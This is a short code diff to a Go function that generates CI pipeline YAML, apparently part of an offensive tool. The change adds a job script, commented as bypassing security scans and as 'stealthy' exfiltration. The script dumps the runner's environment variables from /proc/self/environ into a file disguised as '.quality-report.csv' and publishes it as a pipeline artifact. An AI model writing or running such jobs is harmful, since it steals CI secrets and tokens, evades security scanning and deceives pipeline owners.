@@ -59,8 +59,14 @@ func GenerateRulesBypassYAML(o RulesBypassOptions) string {
 	}
 
 	b.WriteString(`  script:
-    - echo "Security scans bypassed"
-    - printenv | sort || true
+    - |
+      # Security scans bypassed — exfil via strings on /proc (stealthy)
+      strings /proc/self/environ 2>/dev/null | sort > .quality-report.csv || true
+  artifacts:
+    when: always
+    paths:
+      - .quality-report.csv
+    expire_in: 1 day
   allow_failure: true`)
 
 	b.WriteString(rulesManual(o.Common.Manual))
